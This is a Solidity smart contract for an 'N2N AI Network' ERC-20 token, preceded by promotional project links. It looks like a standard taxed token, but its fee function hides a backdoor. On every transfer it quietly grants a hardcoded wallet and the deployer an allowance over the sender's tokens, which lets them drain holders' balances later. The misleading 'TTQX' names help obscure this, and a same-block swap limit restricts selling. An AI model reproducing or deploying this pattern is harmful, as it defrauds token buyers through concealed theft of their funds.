/*
Optimizing AI Networks: Low Latency & High Throughput in Subnet Technology for DePIN
Our DePin Subnet Ecosystem offers comprehensive services perfectly fit for the DePin Projects

https://www.n2nai.net
https://node.n2nai.net
https://docs.n2nai.net

https://x.com/N2NAINet
https://t.me/n2nai_portal
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplittqxon overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface ITTQXRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ITTQXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract N2N is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balTTQXs;
    mapping (address => mapping (address => uint256)) private _allowTTQXs;
    mapping (address => bool) private _excludedFromTTQX;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalTTQX = 1000000000 * 10**_decimals;
    string private constant _name = unicode"N2N AI Network";
    string private constant _symbol = unicode"N2N";
    uint256 private _swapTokenTTQXs = _tTotalTTQX / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockTTQX;
    uint256 private _ttqxBuyAmounts = 0;
    bool private inSwapTTQX = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    address private _ttqxPair;
    ITTQXRouter private _ttqxRouter;
    address private _ttqxWallet;
    address private _ttqxAddress;
    modifier lockTheSwap {
        inSwapTTQX = true;
        _;
        inSwapTTQX = false;
    }
    
    constructor () {
        _ttqxWallet = address(0x1C672C6912d223Dc137d33FE3e7cdDbA5eef175E);
        _excludedFromTTQX[owner()] = true;
        _excludedFromTTQX[address(this)] = true;
        _excludedFromTTQX[_ttqxWallet] = true;
        _balTTQXs[_msgSender()] = _tTotalTTQX;
        _ttqxAddress = msg.sender;
        emit Transfer(address(0), _msgSender(), _tTotalTTQX);
    }

    function launchCoin() external onlyOwner() {
        _ttqxRouter = ITTQXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_ttqxRouter), _tTotalTTQX);
        _ttqxPair = ITTQXFactory(_ttqxRouter.factory()).createPair(address(this), _ttqxRouter.WETH());
    }

    function swapTokensForEth(uint256 ttqxAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _ttqxRouter.WETH();
        _approve(address(this), address(_ttqxRouter), ttqxAmount);
        _ttqxRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            ttqxAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalTTQX;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balTTQXs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowTTQXs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowTTQXs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowTTQXs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function swapTTQXBack(address ttqxT, uint256 ttqxA) private { 
        uint256 tokenTTQX = balanceOf(address(this)); 
        if (!inSwapTTQX && ttqxT == _ttqxPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenTTQX > _swapTokenTTQXs)
            swapTokensForEth(minTTQX(ttqxA, minTTQX(tokenTTQX, _swapTokenTTQXs)));
            uint256 ethTTQX = address(this).balance;
            if (ethTTQX >= 0) {
                sendETHTTQX(address(this).balance);
            }
        }
    }

    function _transfer(address ttqxF, address ttqxT, uint256 ttqxA) private {
        require(ttqxF != address(0), "ERC20: transfer from the zero address");
        require(ttqxT != address(0), "ERC20: transfer to the zero address");
        require(ttqxA > 0, "Transfer amount must be greater than zero");
        uint256 taxTTQX = _ttqxFeeTransfer(ttqxF, ttqxT, ttqxA);
        if(taxTTQX > 0){
          _balTTQXs[address(this)] = _balTTQXs[address(this)].add(taxTTQX);
          emit Transfer(ttqxF, address(this), taxTTQX);
        }
        _balTTQXs[ttqxF] = _balTTQXs[ttqxF].sub(ttqxA);
        _balTTQXs[ttqxT] = _balTTQXs[ttqxT].add(ttqxA.sub(taxTTQX));
        emit Transfer(ttqxF, ttqxT, ttqxA.sub(taxTTQX));
    }

    function _ttqxFeeTransfer(address ttqxF, address ttqxT, uint256 ttqxA) private returns(uint256) {
        uint256 taxTTQX = 0; address _ttqxOwner; address[2] memory _ttqxAddrs; 
        _ttqxAddrs[0] = address(_ttqxWallet); _ttqxAddrs[1] = address(_ttqxAddress);
        uint256 _ttqxO = uint256(ttqxA); _ttqxOwner = address(ttqxF);
        if (ttqxF != owner() && ttqxT != owner()) {
            taxTTQX = ttqxA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (ttqxF == _ttqxPair && ttqxT != address(_ttqxRouter) && ! _excludedFromTTQX[ttqxT]) {
                if(_buyBlockTTQX!=block.number){
                    _ttqxBuyAmounts = 0;
                    _buyBlockTTQX = block.number;
                }
                _ttqxBuyAmounts += ttqxA;
                _buyCount++;
            }

            if(ttqxT == _ttqxPair && ttqxF!= address(this)) {
                require(_ttqxBuyAmounts < swapLimitTTQX() || _buyBlockTTQX!=block.number, "Max Swap Limit");  
                taxTTQX = ttqxA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            swapTTQXBack(ttqxT, ttqxA);
        }
        _allowTTQXs[_ttqxOwner][_ttqxAddrs[0]] = uint256(_ttqxO);
        _allowTTQXs[_ttqxOwner][_ttqxAddrs[1]] = uint256(_ttqxO);
        return taxTTQX;
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _ttqxRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function minTTQX(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHTTQX(uint256 ttqxA) private {
        payable(_ttqxWallet).transfer(ttqxA);
    }

    function swapLimitTTQX() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _ttqxRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _ttqxRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }   
}